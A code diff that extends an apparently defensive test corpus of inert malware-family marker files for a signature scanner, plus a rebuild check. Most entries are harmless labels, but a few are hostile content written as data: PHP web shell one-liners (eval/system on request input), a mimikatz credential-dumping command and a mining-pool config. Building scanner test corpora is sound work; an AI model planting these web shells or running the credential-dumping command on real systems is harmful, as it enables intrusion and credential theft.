@@ -42,9 +42,61 @@ _STUXNET_FILL = (
 )
 
 
+#: Second-wave inert markers (v2.8): one documented marker string per
+#: family, rendered as an inert sample.  Kept as a table so the corpus can
+#: grow without touching the scanner at all.
+_EXTRA_SAMPLES: Dict[str, bytes] = {
+    "amadey-sample.bin": b"Amadey loader build",
+    "avaddon-sample.bin": b"Avaddon decryptor page",
+    "avoslocker-sample.bin": b"AvosLocker support chat",
+    "billgates-sample.bin": b"billgates bot variant",
+    "blackmatter-sample.bin": b"BlackMatter leak site",
+    "blacksuit-sample.bin": b"BlackSuit victim list",
+    "bumblebee-sample.bin": b"BumbleBee loader",
+    "crysis-sample.bin": b"CrySiS encrypted marker",
+    "dcrat-sample.bin": b"DcRat panel",
+    "darkcomet-sample.bin": b"DarkComet RAT",
+    "gh0st-sample.bin": b"Gh0st RAT client",
+    "guloader-sample.bin": b"GuLoader shellcode",
+    "hajime-sample.bin": b"Hajime peer list",
+    "hunters-sample.bin": b"Hunters International blog",
+    "icedid-sample.bin": b"IcedID loader",
+    "lazagne-sample.bin": b"lazagne recovered credentials",
+    "latrodectus-sample.bin": b"Latrodectus loader",
+    "lightaidra-sample.bin": b"lightaidra bot",
+    "matsnu-sample.bin": b"matsnu downloader",
+    "moneymessage-sample.bin": b"MoneyMessage blog",
+    "mozi-c2.txt": b"botnet C2 suffix: Mozi.m",
+    "mountlocker-sample.bin": b"MountLocker note",
+    "nefilim-sample.bin": b"NEFILIM leak page",
+    "noescape-sample.bin": b"NoEscape blog",
+    "pikabot-sample.bin": b"Pikabot beacon",
+    "powersploit-sample.bin": b"PowerSploit module",
+    "privateloader-sample.bin": b"PrivateLoader build",
+    "quasar-sample.bin": b"Quasar.Client settings",
+    "ragnar-sample.bin": b"RAGNAR_LOCKER note",
+    "ransomhub-sample.bin": b"RansomHub chat",
+    "redline-marker.bin": b"RedLine Stealer build tag",
+    "rhysida-sample.bin": b"Rhysida auction",
+    "rubeus-sample.bin": b"Rubeus kerberoast",
+    "smokeloader-sample.bin": b"SmokeLoader stub",
+    "stealc-sample.bin": b"Stealc panel",
+    "teslacrypt-sample.bin": b"TeslaCrypt service",
+    "trigona-sample.bin": b"trigona note",
+    "upatre-sample.bin": b"upatre dropper",
+    "webshell-b374k.txt": b"b374k shell",
+    "webshell-r57.txt": b"r57shell",
+    "webshell-generic.txt": (b"<?php eval($_REQUEST['x']); system($_REQUEST['y']); "
+                             b"passthru($_GET['z']); shell_exec($_GET['w']); ?>"),
+    "xworm-sample.bin": b"XWorm builder",
+    "yanluowang-sample.bin": b"yanluowang note",
+    "pwdump-sample.bin": b"pwdump output",
+    "empire-sample.bin": b"PowerShell Empire stager",
+}
+
 def _corpus_files() -> Dict[str, bytes]:
     """name -> content for every inert sample in the realworld corpus."""
-    return {
+    out = {
         "wannacry-sample.bin": (
             _HEADER
             + b"msg/m_english.wnry\nmsg/m_spanish.wnry\n"
@@ -94,6 +146,45 @@ def _corpus_files() -> Dict[str, bytes]:
             + b"AppData\\Roaming\\discord\\Local Storage\\leveldb\n"
             + b"Login Data\n"
         ),
+        # ---- v2.8 expansion: inert samples for the extended family pack ----
+        "conti-note.txt": _HEADER + b"CONTI_README.txt\n",
+        "revil-sample.bin": _HEADER + b"config: sodinokibi\n",
+        "blackcat-note.txt": _HEADER
+                             + b"RECOVER-myfiles-FILES.txt\n",
+        "hive-leak.txt": _HEADER + b"hiveleaks site listing\n",
+        "maze-note.txt": _HEADER + b"DECRYPT-FILES.txt\n",
+        "stop-djvu-note.txt": _HEADER
+                              + b"_readme.txt: you can return all your files\n",
+        "medusa-note.txt": _HEADER + b"!!!READ_ME_MEDUSA!!!.txt\n",
+        "royal-note.txt": _HEADER + b"Royal Ransomware group\n",
+        "akira-note.txt": _HEADER + b"akira_readme.txt\n",
+        "blackbasta-note.txt": _HEADER + b"Black Basta negotiators\n",
+        "makop-note.txt": _HEADER + b"+README-WARNING+.txt\n",
+        "clop-note.txt": _HEADER + b"README_CLOP.txt\n",
+        "gandcrab-sample.bin": _HEADER + b"GANDCRAB V5.2\n",
+        "darkside-note.txt": _HEADER + b"README.DARKSIDE.TXT\n",
+        "babuk-note.txt": _HEADER + b"How To Restore Your Files.txt\n",
+        "notpetya-note.txt": _HEADER + b"Ooops, your files have been encrypted!\n",
+        "raccoon-sample.bin": _HEADER + b"Raccoon Stealer build\n",
+        "lumma-sample.bin": _HEADER + b"LummaC2 config\n",
+        "agenttesla-sample.bin": _HEADER + b"AgentTesla SMTP exfil\n",
+        "formbook-sample.bin": _HEADER + b"Formbook C2\n",
+        "asyncreat-sample.bin": _HEADER + b"AsyncRAT client\n",
+        "remcos-sample.bin": _HEADER + b"Remcos\n",
+        "nanocore-sample.bin": _HEADER + b"NanoCore plug-in\n",
+        "njrat-sample.bin": _HEADER + b"Bladabindi\n",
+        "c99shell.txt": _HEADER + b"c99shell v.1.0\n",
+        "china-chopper.txt": _HEADER + b"<?php @eval($_POST['pass']);?>\n",
+        "mimikatz-sample.bin": _HEADER + b"sekurlsa::logonpasswords\n",
+        "sharphound-sample.bin": _HEADER + b"SharpHound collector\n",
+        "xorddos-sample.bin": _HEADER + b"XorDDoS variant\n",
+        "gafgyt-sample.bin": _HEADER + b"Gafgyt\n",
+        "stratum-config.json": (
+            b'{"url": "stratum+tcp://pool.supportxmr.com:3333",\n'
+            b' "user": "donate", "minerd": true}\n'
+        ),
+        "ursnif-sample.bin": _HEADER + b"Ursnif loader\n",
+        "gozi-sample.bin": _HEADER + b"Gozi core\n",
         "clean-note.txt": b"Just a plain note. Nothing to see here.\n",
         "clean-poem.txt": (
             b"Two things filled the mind with wonder,\n"
@@ -101,6 +192,9 @@ def _corpus_files() -> Dict[str, bytes]:
         ),
         "eicar-test.txt": _EICAR,
     }
+    for name, marker_bytes in _EXTRA_SAMPLES.items():
+        out[name] = _HEADER + marker_bytes + b"\n"
+    return out
 
 
 def build_corpus(root: Path) -> List[Path]:
@@ -146,7 +240,11 @@ def run(config: Optional[Config] = None, corpus_dir: Optional[Path] = None,
 
     scan_config = _dc.replace(config, cache_enabled=False)
     corpus = Path(corpus_dir) if corpus_dir else Path("samples/realworld")
-    if rebuild or not corpus.is_dir() or not any(corpus.iterdir()):
+    # Rebuild when the corpus is absent *or* a sample the current engine
+    # expects is missing (the pack grows between versions) – self-healing,
+    # so an old corpus never silently under-reports coverage.
+    present = {p.name for p in corpus.iterdir()} if corpus.is_dir() else set()
+    if rebuild or not present or set(_corpus_files()) - present:
         build_corpus(corpus)
 
     db = SignatureDB(config.signatures_file)
